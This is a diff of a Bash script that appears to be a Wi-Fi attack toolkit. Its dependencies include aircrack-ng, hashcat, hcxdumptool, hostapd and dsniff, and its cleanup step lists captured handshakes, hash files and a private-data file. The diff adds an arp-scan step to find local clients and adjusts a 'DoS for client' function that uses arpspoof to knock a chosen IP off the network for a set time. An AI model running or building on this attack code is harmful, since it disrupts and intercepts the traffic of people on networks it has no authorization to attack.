@@ -10,6 +10,7 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 cleancolor="echo -e "${endColour}""
+tarnomon="$(echo "$tar" | sed 's/mon$//')"
 
 filestrash() {
 	files=(dnsmasq.conf hostapd.conf Capture.pcapng hash.hc22000 iface Handshake* datos-privados.txt TsharkCap)
@@ -46,7 +47,7 @@ fedora=$(echo $?)
 #On the basis of the distribution, download the dependencies 
 programs() {
 	
-	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff)
+	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff arp-scan)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -464,13 +465,16 @@ modeagain () {
 }
 
 dosforclient () {
+
 	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client... Wait a moment"
 	reconnect
+	arp-scan -I $tarnomon --localnet 
+	sleep 1
 	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
 	echo -ne "${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
 	tput civis
 	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\x\)$/1/g')
-	xterm -hold -e "sudo arpspoof -i "$tar" -t "$clientattackdos" "$ipnew"" &
+	xterm -hold -e "sudo arpspoof -i "$tarnomon" -t "$clientattackdos" "$ipnew"" &
 	arpspoof_PID=$!
 	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
 	modeagain
